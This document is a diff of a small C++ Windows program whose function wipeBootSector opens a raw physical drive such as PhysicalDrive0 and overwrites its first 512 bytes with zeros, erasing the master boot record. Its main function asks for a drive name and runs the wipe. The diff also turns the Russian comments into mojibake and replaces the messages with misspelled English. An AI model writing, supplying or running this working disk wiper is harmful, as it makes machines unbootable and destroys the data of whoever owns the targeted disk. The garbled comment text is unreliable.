@@ -2,40 +2,40 @@
 #include <windows.h>
 
 void wipeBootSector(const std::string& drive) {
-    // Открываем диск для записи
+    // ГЋГІГЄГ°Г»ГўГ ГҐГ¬ Г¤ГЁГ±ГЄ Г¤Г«Гї Г§Г ГЇГЁГ±ГЁ
     HANDLE hDrive = CreateFile(
-        drive.c_str(), // Например, "\\\\.\\PhysicalDrive0"
-        GENERIC_WRITE,  // Открыть для записи
-        0,             // Нет совместного доступа
-        nullptr,       // Нет атрибутов безопасности
-        OPEN_EXISTING, // Открыть существующий диск
-        0,             // Нет дополнительных флагов
-        nullptr        // Нет шаблона
+        drive.c_str(), // ГЌГ ГЇГ°ГЁГ¬ГҐГ°, "\\\\.\\PhysicalDrive0"
+        GENERIC_WRITE,  // ГЋГІГЄГ°Г»ГІГј Г¤Г«Гї Г§Г ГЇГЁГ±ГЁ
+        0,             // ГЌГҐГІ Г±Г®ГўГ¬ГҐГ±ГІГ­Г®ГЈГ® Г¤Г®Г±ГІГіГЇГ 
+        nullptr,       // ГЌГҐГІ Г ГІГ°ГЁГЎГіГІГ®Гў ГЎГҐГ§Г®ГЇГ Г±Г­Г®Г±ГІГЁ
+        OPEN_EXISTING, // ГЋГІГЄГ°Г»ГІГј Г±ГіГ№ГҐГ±ГІГўГіГѕГ№ГЁГ© Г¤ГЁГ±ГЄ
+        0,             // ГЌГҐГІ Г¤Г®ГЇГ®Г«Г­ГЁГІГҐГ«ГјГ­Г»Гµ ГґГ«Г ГЈГ®Гў
+        nullptr        // ГЌГҐГІ ГёГ ГЎГ«Г®Г­Г 
     );
 
     if (hDrive == INVALID_HANDLE_VALUE) {
-        std::cerr << "Ошибка открытия диска: " << GetLastError() << std::endl;
+        std::cerr << "Eror disk code: " << GetLastError() << std::endl;
         return;
     }
 
-    // Записываем 512 байт нулей
+    // Г‡Г ГЇГЁГ±Г»ГўГ ГҐГ¬ 512 ГЎГ Г©ГІ Г­ГіГ«ГҐГ©
     char buffer[512] = {0};
     DWORD bytesWritten;
 
     BOOL result = WriteFile(hDrive, buffer, sizeof(buffer), &bytesWritten, nullptr);
     if (!result) {
-        std::cerr << "Ошибка записи на диск: " << GetLastError() << std::endl;
+        std::cerr << "disk write error: " << GetLastError() << std::endl;
     } else {
-        std::cout << "Загрузочный сектор успешно стер." << std::endl;
+        std::cout << "MBR deleted." << std::endl;
     }
 
-    // Закрываем дескриптор диска
+    // Г‡Г ГЄГ°Г»ГўГ ГҐГ¬ Г¤ГҐГ±ГЄГ°ГЁГЇГІГ®Г° Г¤ГЁГ±ГЄГ 
     CloseHandle(hDrive);
 }
 
 int main() {
     std::string drive;
-    std::cout << "Введите букву диска (например, \\\\.\\PhysicalDrive0): ";
+    std::cout << "Enter Disk name, \\\\.\\PhysicalDrive0): ";
     std::getline(std::cin, drive);
 
     wipeBootSector(drive);
